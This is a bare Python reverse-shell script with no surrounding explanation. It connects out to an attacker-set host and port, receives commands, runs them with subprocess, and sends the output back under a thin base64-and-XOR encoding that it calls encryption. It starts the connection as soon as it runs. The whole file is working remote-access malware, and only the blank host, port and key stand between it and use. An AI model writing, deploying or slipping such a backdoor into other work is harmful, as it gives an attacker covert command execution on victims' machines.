
import socket
import base64
import subprocess
import os

# Reverse connection to the host and port
host = ""
port = ""

# Encryption key for communication
key = ""

def encrypt(message):
    encoded = base64.b64encode(message.encode())
    encrypted = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encoded.decode()))
    return encrypted

def decrypt(message):
    decrypted = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in    enumerate(message))
    decoded = base64.b64decode(decrypted.encode())
    return decoded.decode()

def connect():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        while True:
            command = sock.recv(1024).decode()
            if command == "exit":
                break
            elif command.startswith("cd"):
                _, path = command.split(" ", 1)
                os.chdir(path)
                response = encrypt("Changed directory to " + os.getcwd())
            else:
                output = subprocess.getoutput(command)
                response = encrypt(output)
            sock.send(response.encode())
        sock.close()
    except Exception as e:
        print("Error:", str(e))

connect()
